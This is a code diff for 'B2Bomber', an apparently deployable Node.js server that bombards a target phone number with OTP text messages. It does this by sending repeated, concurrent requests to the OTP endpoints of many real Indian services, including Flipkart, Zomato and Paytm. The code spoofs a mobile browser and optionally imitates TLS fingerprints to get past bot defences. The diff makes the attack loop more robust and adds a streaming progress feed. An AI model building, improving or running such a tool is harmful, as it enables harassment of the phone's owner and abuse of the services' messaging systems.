@@ -1,12 +1,16 @@
 /**
- * B2Bomber — multi-site OTP sender
- * Node 18+/20 · ESM · Render-ready
- * Endpoints (public/index.html inhi ko call karta hai):
- *   GET  /api/health          -> { services, live, benched, impit }
- *   GET  /api/diag            -> outbound connectivity + env info
- *   GET  /api/selftest?number -> ek-ek service ko ek baar hit karke report
- *   POST /api/stats/reset     -> health/bench reset
- *   POST /api/bomb            -> NDJSON stream: start / result / done / error
+ * ============================================================
+ *  B2Bomber — multi-site OTP sender
+ *  Node 18+ / 20  ·  ESM  ·  Render-ready  ·  single file
+ * ============================================================
+ *  Endpoints (public/index.html inhi ko call karta hai):
+ *    GET  /api/health            -> { ok, services, live, benched, impit }
+ *    GET  /api/diag              -> outbound connectivity + env info
+ *    GET  /api/services          -> service list + health
+ *    GET  /api/selftest?number=  -> har service ko 1 baar hit karke report
+ *    POST /api/stats/reset       -> health / bench reset
+ *    POST /api/bomb              -> NDJSON stream: start / ping / result / done / error
+ * ============================================================
  */
 import express from 'express';
 import path from 'node:path';
@@ -15,21 +19,21 @@ import { fileURLToPath } from 'node:url';
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 
+/* ----------------------------- config ----------------------------- */
 const PORT        = Number(process.env.PORT || 3000);
 const HOST        = '0.0.0.0';
 const TIMEOUT_MS  = Number(process.env.OTP_TIMEOUT_MS || 12000); // per request
 const CONCURRENCY = Number(process.env.OTP_CONCURRENCY || 8);    // parallel workers
-const STAGGER_MS  = Number(process.env.OTP_STAGGER_MS || 120);   // worker ke beech gap
-const BENCH_AFTER = Number(process.env.OTP_BENCH_AFTER || 3);    // kitne lagatar fail pe bench
+const STAGGER_MS  = Number(process.env.OTP_STAGGER_MS || 120);   // worker gap
+const BENCH_AFTER = Number(process.env.OTP_BENCH_AFTER || 3);    // lagatar fail -> bench
+const HB_MS       = 10000;                                       // stream heartbeat
 
-/* ------------------------------------------------------------------ *
- * 0. Crash-proofing (Render pe silent crash na ho)
- * ------------------------------------------------------------------ */
+/* -------------------- crash-proofing (Render) --------------------- */
 process.on('unhandledRejection', e => console.error('[unhandledRejection]', e));
 process.on('uncaughtException',  e => console.error('[uncaughtException]', e));
 
 /* ------------------------------------------------------------------ *
- * 1. Optional impit (TLS/browser fingerprint) — na ho to fetch
+ * Optional impit (browser/TLS fingerprint). Na mile to global fetch.
  * ------------------------------------------------------------------ */
 let ImpitCtor = null;
 try {
@@ -48,18 +52,23 @@ function getImpit() {
   return impitClient;
 }
 
-async function httpCall(svc, url, init) {
-  const client = svc.impit === false ? null : getImpit();
-  if (client) {
-    try { return await client.fetch(url, init); } catch { /* fall back */ }
-  }
-  return fetch(url, init);
-}
-
 /* ------------------------------------------------------------------ *
- * 2. Helpers
+ * helpers
  * ------------------------------------------------------------------ */
 const sleep = ms => new Promise(r => setTimeout(r, ms));
+
+function hardTimeout(promise, ms) {
+  let timer;
+  return Promise.race([
+    promise,
+    new Promise((_, rej) => {
+      timer = setTimeout(
+        () => rej(Object.assign(new Error('timeout'), { name: 'TimeoutError' })),
+        ms
+      );
+    }),
+  ]).finally(() => clearTimeout(timer));
+}
 
 const UA = 'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36';
 
@@ -85,12 +94,14 @@ function makeCtx(number) {
 }
 
 /* ------------------------------------------------------------------ *
- * 3. Service list  (id / name / url / method / headers / body)
- *    Naya site add karna ho -> ek object push kar do, bas.
- *    body: GET me url() ke andar, POST me body(ctx) se.
+ * SERVICES
+ *   add/remove karne ke liye bas ek object push/delete kar do.
+ *   url    : string  ya  (ctx) => string
+ *   method : 'GET' | 'POST'   (default GET)
+ *   body   : (ctx) => string  (sirf non-GET ke liye)
  * ------------------------------------------------------------------ */
 const SERVICES = [
-  /* ---- shopping / e-commerce ---- */
+  /* ---------------- shopping / e-commerce ---------------- */
   { id: 'flipkart', name: 'Flipkart', method: 'POST',
     url: 'https://www.flipkart.com/api/5/user/otp/generate',
     headers: { ...JSONH,
@@ -137,7 +148,7 @@ const SERVICES = [
     headers: { ...JSONH, origin: 'https://pharmeasy.in' },
     body: c => JSON.stringify({ phone: c.ten }) },
 
-  /* ---- food / travel / rides ---- */
+  /* ---------------- food / travel / rides ---------------- */
   { id: 'zomato', name: 'Zomato', method: 'POST',
     url: 'https://www.zomato.com/webroutes/auth/sendOtp',
     headers: { ...JSONH, origin: 'https://www.zomato.com', referer: 'https://www.zomato.com/' },
@@ -175,7 +186,7 @@ const SERVICES = [
     url: c => `https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=${c.ten}&countryCode=91`,
     headers: { ...JSONH } },
 
-  /* ---- fintech / other ---- */
+  /* ---------------- fintech / misc ---------------- */
   { id: 'paytm', name: 'Paytm', method: 'POST',
     url: 'https://commonfront.paytm.com/v4/api/sendsms',
     headers: { ...JSONH, origin: 'https://paytm.com' },
@@ -239,7 +250,7 @@ const SERVICES = [
 ];
 
 /* ------------------------------------------------------------------ *
- * 4. Health / bench tracking (memory me; /api/stats/reset se clear)
+ * health / bench tracking  (memory only)
  * ------------------------------------------------------------------ */
 const health = new Map(); // id -> { ok, fail, streak, benched, status, ms }
 
@@ -247,34 +258,53 @@ function note(svc, ok, status, ms) {
   const h = health.get(svc.id) || { ok: 0, fail: 0, streak: 0, benched: false, status: 0, ms: 0 };
   h.status = status || 0;
   h.ms = ms || 0;
-  if (ok) { h.ok++; h.streak = 0; h.benched = false; }
-  else {
+  if (ok) {
+    h.ok++; h.streak = 0; h.benched = false;
+  } else {
     h.fail++; h.streak++;
     if (h.streak >= BENCH_AFTER) h.benched = true;
   }
   health.set(svc.id, h);
 }
 
+function healthSnapshot() {
+  return SERVICES.map(s => {
+    const h = health.get(s.id) || { ok: 0, fail: 0, streak: 0, benched: false, status: 0, ms: 0 };
+    return { id: s.id, name: s.name, ...h };
+  });
+}
+
 /* ------------------------------------------------------------------ *
- * 5. Ek service ko hit karna
+ * ek service hit karo — kabhi throw nahi karta, hamesha object deta hai
  * ------------------------------------------------------------------ */
 async function sendOne(svc, ctx) {
-  const url = typeof svc.url === 'function' ? svc.url(ctx) : svc.url;
-  const method = svc.method || 'GET';
-  const init = {
-    method,
-    headers: { ...(svc.headers || {}) },
-    redirect: 'follow',
-    signal: AbortSignal.timeout(TIMEOUT_MS),
-  };
-  if (method !== 'GET' && typeof svc.body === 'function') init.body = svc.body(ctx);
-
   const t0 = Date.now();
+  let url = '';
   try {
-    const res = await httpCall(svc, url, init);
-    const text = await res.text().catch(() => '');
+    url = typeof svc.url === 'function' ? svc.url(ctx) : svc.url;
+    const method = svc.method || 'GET';
+
+    const init = {
+      method,
+      headers: { ...(svc.headers || {}) },
+      redirect: 'follow',
+      signal: AbortSignal.timeout(TIMEOUT_MS),
+    };
+    if (method !== 'GET' && typeof svc.body === 'function') init.body = svc.body(ctx);
+
+    const doCall = async () => {
+      const client = svc.impit === false ? null : getImpit();
+      if (client) {
+        try { return await client.fetch(url, init); } catch { /* fetch pe fallback */ }
+      }
+      return await fetch(url, init);
+    };
+
+    const res = await hardTimeout(doCall(), TIMEOUT_MS + 1500);
+    const text = await hardTimeout(Promise.resolve(res.text()).catch(() => ''), 5000).catch(() => '');
     const ms = Date.now() - t0;
     const ok = res.status >= 200 && res.status < 400;
+
     return {
       ok, status: res.status, ms, url,
       snippet: String(text).replace(/\s+/g, ' ').trim().slice(0, 120),
@@ -288,19 +318,26 @@ async function sendOne(svc, ctx) {
 }
 
 /* ------------------------------------------------------------------ *
- * 6. Express app
+ * express app
  * ------------------------------------------------------------------ */
 const app = express();
 app.set('trust proxy', 1);
 app.disable('x-powered-by');
 app.use(express.json({ limit: '256kb' }));
+app.use(express.urlencoded({ extended: false, limit: '256kb' }));
+
+/* permissive CORS */
+app.use((req, res, next) => {
+  res.setHeader('access-control-allow-origin', '*');
+  res.setHeader('access-control-allow-headers', 'content-type');
+  res.setHeader('access-control-allow-methods', 'GET,POST,OPTIONS');
+  if (req.method === 'OPTIONS') return res.sendStatus(204);
+  next();
+});
 
 app.use((req, _res, next) => { console.log(`${req.method} ${req.url}`); next(); });
 
-app.use(express.static(path.join(__dirname, 'public'), { extensions: ['html'] }));
-app.get('/', (_req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
-
-/* --- health (Render ka healthCheckPath bhi yahi hai) --- */
+/* ------------------------------ health ---------------------------- */
 app.get('/api/health', (_req, res) => {
   const benched = [...health.values()].filter(h => h.benched).length;
   res.json({
@@ -314,13 +351,22 @@ app.get('/api/health', (_req, res) => {
   });
 });
 
-/* --- stats reset --- */
+/* --------------------------- stats reset -------------------------- */
 app.post('/api/stats/reset', (_req, res) => {
   health.clear();
   res.json({ ok: true, reset: true });
 });
 
-/* --- outbound diag --- */
+/* --------------------------- services ----------------------------- */
+app.get('/api/services', (_req, res) => {
+  res.json({
+    ok: true,
+    count: SERVICES.length,
+    services: healthSnapshot().map(s => ({ id: s.id, name: s.name, benched: s.benched, ok: s.ok, fail: s.fail, status: s.status, ms: s.ms })),
+  });
+});
+
+/* ------------------------------ diag ------------------------------ */
 app.get('/api/diag', async (_req, res) => {
   const targets = [
     'https://www.google.com/generate_204',
@@ -349,7 +395,7 @@ app.get('/api/diag', async (_req, res) => {
   });
 });
 
-/* --- self-test: har service ko ek baar hit karo --- */
+/* ---------------------------- self-test --------------------------- */
 app.get('/api/selftest', async (req, res) => {
   const raw = String(req.query.number || '9999999999');
   const ctx = makeCtx(raw.length === 10 ? raw : raw.slice(-10));
@@ -357,6 +403,7 @@ app.get('/api/selftest', async (req, res) => {
 
   const results = [];
   let idx = 0;
+
   const workers = Array.from({ length: Math.min(CONCURRENCY, list.length) }, async () => {
     while (true) {
       const i = idx++;
@@ -364,9 +411,13 @@ app.get('/api/selftest', async (req, res) => {
       const svc = list[i];
       const r = await sendOne(svc, ctx);
       note(svc, r.ok, r.status, r.ms);
-      results.push({ id: svc.id, name: svc.name, ok: r.ok, status: r.status, ms: r.ms, error: r.error, snippet: r.snippet, url: r.url });
+      results.push({
+        id: svc.id, name: svc.name, ok: r.ok, status: r.status,
+        ms: r.ms, error: r.error, snippet: r.snippet, url: r.url,
+      });
     }
   });
+
   await Promise.all(workers);
 
   res.json({
@@ -377,87 +428,129 @@ app.get('/api/selftest', async (req, res) => {
   });
 });
 
-/* --- main bomber: NDJSON stream --- */
+/* ------------------- main bomber : NDJSON stream ------------------- */
 app.post('/api/bomb', async (req, res) => {
-  const number = String(req.body?.number || '').replace(/\D/g, '');
-  const repeat = Math.min(20, Math.max(1, Number(req.body?.repeat) || 1));
-  const skipDead = req.body?.skipDead !== false;
+  try {
+    const number = String(req.body?.number || '').replace(/\D/g, '');
+    const repeat = Math.min(20, Math.max(1, Number(req.body?.repeat) || 1));
+    const skipDead = req.body?.skipDead !== false;
 
-  if (number.length < 10 || number.length > 15) {
-    return res.status(400).json({ error: 'invalid number' });
-  }
-
-  const ctx = makeCtx(number);
-  const active = SERVICES.filter(s => !(skipDead && health.get(s.id)?.benched));
-  const skipped = SERVICES.length - active.length;
-  const total = active.length * repeat;
-
-  res.writeHead(200, {
-    'content-type': 'application/x-ndjson; charset=utf-8',
-    'cache-control': 'no-cache, no-transform',
-    'connection': 'keep-alive',
-    'x-accel-buffering': 'no', // Render/proxy buffering band
-  });
-
-  const emit = o => { try { res.write(JSON.stringify(o) + '\n'); } catch {} };
-  emit({ type: 'start', total, services: active.length, repeat, skipped, number: ctx.full });
-
-  if (!total) {
-    emit({ type: 'done', sent: 0, failed: 0, total: 0, done: 0 });
-    return res.end();
-  }
-
-  // task queue: round-major -> consecutive tasks alag-alag service
-  const tasks = [];
-  for (let r = 0; r < repeat; r++) for (const s of active) tasks.push(s);
-
-  let cursor = 0, done = 0, sent = 0, failed = 0, aborted = false;
-  req.on('close', () => { aborted = true; });
-
-  const worker = async () => {
-    while (!aborted) {
-      const i = cursor++;
-      if (i >= tasks.length) return;
-      const svc = tasks[i];
-
-      const r = await sendOne(svc, ctx);
-      if (aborted) return;
-
-      note(svc, r.ok, r.status, r.ms);
-      done++; r.ok ? sent++ : failed++;
-
-      emit({
-        type: 'result', done, sent, failed,
-        id: svc.id, name: svc.name,
-        status: r.status, ms: r.ms, ok: r.ok,
-        error: r.error, snippet: r.snippet, url: r.url,
-      });
-
-      if (STAGGER_MS) await sleep(STAGGER_MS);
+    if (number.length < 10 || number.length > 15) {
+      return res.status(400).json({ error: 'invalid number' });
     }
-  };
 
-  await Promise.all(Array.from({ length: Math.min(CONCURRENCY, tasks.length) }, worker));
+    const ctx = makeCtx(number);
+    const active = SERVICES.filter(s => !(skipDead && health.get(s.id)?.benched));
+    const skipped = SERVICES.length - active.length;
+    const total = active.length * repeat;
 
-  if (!aborted) emit({ type: 'done', sent, failed, total, done });
-  res.end();
+    res.writeHead(200, {
+      'content-type': 'application/x-ndjson; charset=utf-8',
+      'cache-control': 'no-cache, no-transform',
+      'x-accel-buffering': 'no',
+    });
+    res.flushHeaders?.();
+
+    // IMPORTANT: 'close' ko res par suno, req par nahi.
+    // req 'close' body padhne ke baad hi fire hota hai (Node 16+),
+    // isliye pehle turant abort lag jata tha aur 0 result aata tha.
+    let closed = false;
+    res.on('close', () => { if (!res.writableEnded) closed = true; });
+    res.on('error', () => { closed = true; });
+
+    const emit = (o) => {
+      if (res.writableEnded) return;
+      try { res.write(JSON.stringify(o) + '\n'); } catch {}
+    };
+
+    // proxy buffering ke against heartbeat (frontend ise skip karta hai)
+    const hb = setInterval(() => emit({ type: 'ping', t: Date.now() }), HB_MS);
+
+    const finishAll = (o) => {
+      clearInterval(hb);
+      emit(o);
+      if (!res.writableEnded) { try { res.end(); } catch {} }
+    };
+
+    emit({ type: 'start', total, services: active.length, repeat, skipped, number: ctx.full });
+
+    if (!total) return finishAll({ type: 'done', sent: 0, failed: 0, total: 0, done: 0 });
+
+    // round-major queue -> consecutive tasks alag-alag service
+    const tasks = [];
+    for (let r = 0; r < repeat; r++) for (const s of active) tasks.push(s);
+
+    let cursor = 0, done = 0, sent = 0, failed = 0;
+
+    const worker = async () => {
+      while (!closed) {
+        const i = cursor++;
+        if (i >= tasks.length) return;
+        const svc = tasks[i];
+
+        let r;
+        try { r = await sendOne(svc, ctx); }
+        catch (e) {
+          r = { ok: false, status: 0, ms: 0, url: '', snippet: '', error: e?.message || 'worker error' };
+        }
+        if (closed) return;
+
+        note(svc, r.ok, r.status, r.ms);
+        done++; r.ok ? sent++ : failed++;
+
+        emit({
+          type: 'result', done, sent, failed,
+          id: svc.id, name: svc.name,
+          status: r.status, ms: r.ms, ok: r.ok,
+          error: r.error, snippet: r.snippet, url: r.url,
+        });
+
+        if (STAGGER_MS) await sleep(STAGGER_MS);
+      }
+    };
+
+    try {
+      await Promise.all(Array.from({ length: Math.min(CONCURRENCY, tasks.length) }, worker));
+    } catch (e) {
+      emit({ type: 'error', error: e?.message || 'worker crashed' });
+    }
+
+    finishAll({ type: 'done', sent, failed, total, done });
+  } catch (e) {
+    console.error('[bomb]', e);
+    if (!res.headersSent) {
+      res.status(500).json({ error: e?.message || 'server error' });
+    } else {
+      try {
+        res.write(JSON.stringify({ type: 'error', error: e?.message || 'server error' }) + '\n');
+        res.end();
+      } catch {}
+    }
+  }
 });
 
-/* --- API 404 --- */
+/* ---------------------------- API 404 ----------------------------- */
 app.use('/api', (_req, res) => res.status(404).json({ error: 'not found' }));
 
-/* --- error handler --- */
+/* --------------------------- static files -------------------------- */
+app.use(express.static(path.join(__dirname, 'public'), { extensions: ['html'] }));
+app.get('/', (_req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
+app.get('/favicon.ico', (_req, res) => res.status(204).end());
+
+/* -------------------------- error handler -------------------------- */
 app.use((err, _req, res, _next) => {
   console.error('[error]', err);
   if (!res.headersSent) res.status(500).json({ error: err?.message || 'server error' });
 });
 
-/* ------------------------------------------------------------------ *
- * 7. Listen
- * ------------------------------------------------------------------ */
+/* ------------------------------ listen ----------------------------- */
 const server = app.listen(PORT, HOST, () => {
   console.log(`B2Bomber up on :${PORT} | ${SERVICES.length} services | impit ${getImpit() ? 'ON' : 'OFF'} | node ${process.version}`);
 });
+
 server.keepAliveTimeout = 65000;
-server.headersTimeout = 66000;
-server.requestTimeout = 0;   // long streams ke liye
+server.headersTimeout  = 66000;
+server.requestTimeout  = 0;   // long stream ke liye
+server.timeout         = 0;
+
+export default app;
